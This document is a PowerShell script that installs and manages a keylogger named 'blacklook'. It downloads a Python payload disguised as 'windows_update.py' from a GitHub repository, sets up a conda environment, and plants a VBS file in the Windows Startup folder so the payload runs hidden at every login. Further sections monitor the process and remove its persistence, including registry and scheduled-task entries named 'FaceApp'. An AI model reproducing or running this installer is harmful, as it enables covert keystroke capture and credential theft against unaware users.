

##########################################Start######################################

New-Item -ItemType Directory -Path "C:\sys" -Force; Set-Location "C:\sys"

# Download environment.yml
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/montasirrahman/blacklook/main/environment.yml" -OutFile "environment.yml"

# Download windows_update.py
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/montasirrahman/blacklook/main/windows_update.py" -OutFile "windows_update.py"


# import conda env
conda env create -f environment.yml


# start 
# ============================================================
# Create and run VBS immediately
$vbsContent = @'
Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "C:\sys"
WshShell.Run "cmd /c conda activate blacklook && python windows_update.py", 0, False
'@

$vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\start_blacklook.vbs"
$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII

Write-Host "✅ Startup VBS file created successfully!"

# Run the VBS file to start immediately
Write-Host "🚀 Starting keylogger now..." -ForegroundColor Green
& wscript.exe $vbsPath

Write-Host "✅ Keylogger started! (Running hidden)" -ForegroundColor Green
Write-Host "📍 It will also auto-start on every Windows login" -ForegroundColor Yellow






##############################################status#########################################
# status
# ==================================================================
# Refresh every 5 seconds to monitor
while($true) {
    Clear-Host
    $process = Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like "*windows_update.py*"}
    Write-Host "Script Status: $(if($process){'RUNNING - PID: ' + $process.ProcessId}else{'STOPPED'})" -ForegroundColor $(if($process){'Green'}else{'Red'})
    Start-Sleep -Seconds 5
}




################################################Stop###############################################
# stop
# =================================================================
# Stop all related processes
Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like "*windows_update.py*"} | ForEach-Object {Stop-Process -Id $_.ProcessId -Force}
Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like "*blacklook*"} | ForEach-Object {Stop-Process -Id $_.ProcessId -Force}

# Remove startup files
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\start_blacklook.vbs" -ErrorAction SilentlyContinue
Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\start_blacklook.vbs" -ErrorAction SilentlyContinue

# Remove registry entries
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "FaceApp" -ErrorAction SilentlyContinue

# Remove scheduled tasks
Unregister-ScheduledTask -TaskName "FaceAppStartup" -Confirm:$false -ErrorAction SilentlyContinue

Write-Host "Cleanup completed!" -ForegroundColor Green
